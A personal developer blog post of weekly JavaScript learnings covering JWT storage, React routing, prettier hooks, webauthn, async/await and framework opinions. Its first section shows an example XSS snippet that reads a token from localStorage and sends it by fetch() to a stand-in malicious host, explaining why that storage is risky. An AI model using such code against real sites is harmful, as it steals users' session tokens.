---
title: Weekly Learnings 23rd of May
description: Weekly learnings for the 23rd of May 2019
updatedAt: May 23, 2019
img: https://images.unsplash.com/photo-1584697964400-2af6a2f6204c?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=60
alt: Weekly learnings
tags:
  - javascript
  - learnings
  - web-dev
author:
  name: David Yu
  bio: I love to code
  img: /_nuxt/assets/content/davidthrone.jpg
---

## Storing JWT tokens in localStorage

Storing JWT tokens in `localStorage` is common but it is considered bad practice since it opens you up to exploitation if an XSS attack can be conducted. The token can be accessed if the attacker can execute malicious Javascript on your machine something like this.

```js
fetch('http://somemaliciousendpoint.com', {
  method: 'GET',
  headers: {
    Authorization: `Bearer ${localStorage.getItem('accessToken')}`
  }
})
```

## Dynamic navigation in React

React is like the Microsoft for frontend developers. It simply isn't developer friendly and the library `react-router-dom` which allows us to build SPAs is no exception. There isn't any clear definitive way to dynamically route with it. However the two ways I think are good.

If you have wrapped your app with `<BrowserRouter></BrowserRouter>` component then the `history` object will automatically be passed to all your pages (navigatable components) and you can call `props.history.push('/route-i-want-to-go-to)` or for other components you will have to wrap them in the `withRouter` higher order component to pass the `history` object as a `prop`

If you use `<HashRouter></HashRouter>` component then you can navigate with `location.hash = 'route-i-want-to-go-to`

## A better way to format your project

```sh
yarn add prettier --dev --exact
yarn add pretty-quick husky --dev
```

Add this to your package.json

```js
{ "husky": { "hooks": { "pre-commit": "pretty-quick --staged" } } }
```

Now prettier will format only changed files when you `git-commit`

## The future of authentication

It has always been a pain point for developers to integrate authentication in their apps. Not only that but it has security issues e.g. password reuse and its annoying to enter usernames/passwords to authenticate. Introducing two very exciting developments

- **One tap sign on** by Google signs the user in through one click. Presumably the user still needs to maintain a Google account and they are already authed with their browser. There are a lot of requirements for this one but thus far it provides the best user and developer experience as an auth strategy.

- **webauthn** This one is the most exciting and even if this isn't the exact spec that gets widely used the idea should be what we are heading towards in the future. The idea is that we use biometrics like fingerprints and facial recognition to login to a website. We already can do this for our apps but now we are going to do it for websites.

## Async/await

This syntax

```js
try {
  const response = await someAsyncCallThatReturnsAPromise()
  const response1 = await someAsyncCallThatReturnsAPromise1()
  const response2 = await someAsyncCallThatReturnsAPromise2()
} catch (err) {
  console.error("Shouldn't have failed")
}
```

has become the new standard for writing async applications due it is synchronous like nature that makes it easier for developers to reason with. However one annoying thing that we would have to do is wrap the calls in an async function.

```js{1,7}
;(async () => {
  try {
    const response = await someAsyncCallThatReturnsAPromise()
    const response1 = await someAsyncCallThatReturnsAPromise1()
    const response2 = await someAsyncCallThatReturnsAPromise2()
  } catch (err) {
    console.error("Shouldn't have failed")
  }
})()
```

In order for that code to compile we had to wrap that in an IIFE with the async tag. This is because async/await functions always return a promise and to properly call them we also have to await them

```js{1}
await (async () => {
  try {
    const response = await someAsyncCallThatReturnsAPromise()
    const response1 = await someAsyncCallThatReturnsAPromise1()
    const response2 = await someAsyncCallThatReturnsAPromise2()
  } catch (err) {
    console.error("Shouldn't have failed")
  }
})()
```

Now the parent function has to do something similar. I like this approach because we are explicit about things. Although forgetting to await has caused a lot of bugs modern IDEs should tell you if a function returns a promise or not.

## Svelte

Svelte looks really exciting and I look forward to developing a small real world application with it or build on top of their example. It reminds me of Ruby. Although it appears a lot of magic is going on and it abstracts away a lot of things it improves developer experience but in the past these sorts of languages have never gained momentum, e.g. pug and CoffeeScript. HTML, JS and CSS has seem to always win out in the end which is quite ominous for svelte. I think at the end the big tech companies are the ones that sway the industry if they don't adopt svelte then it won't ever reach critical mass. Therefore it is unlikely it will ever be able to compete with React in terms of industry adoption. Even Vue with its massive popularity still hasn't been widely adopted in the industry except for China.

## React + Apollo + Prisma

Still dislike React in terms of developer experience. I just don't have time and energy to detail for the low level things like updating the dam cache. Prisma is cool gives us free CRUD, pagination and filtering but I can see it struggling when we start to build real world applications due to its unopinionated nature like Express. This is fine for large companies with massive dev teams like I have said before but for the majority of companies and dev teams this wouldn't work for them.

## Misc stuff

- Insomnia is a nice replacement for Postman
- The difference between function `helloworld() {}` and `helloworld = () => {}` is that the first one will automatically hoist the function up so you can use it anywhere
- Ngrok can allow your local dev server to be accessible in the cloud but it is very slow
- Chrome has a lazy attribute for images now e.g. `<img loading="lazy">`
- We should use `Sets` more because they are faster and you can access them by value
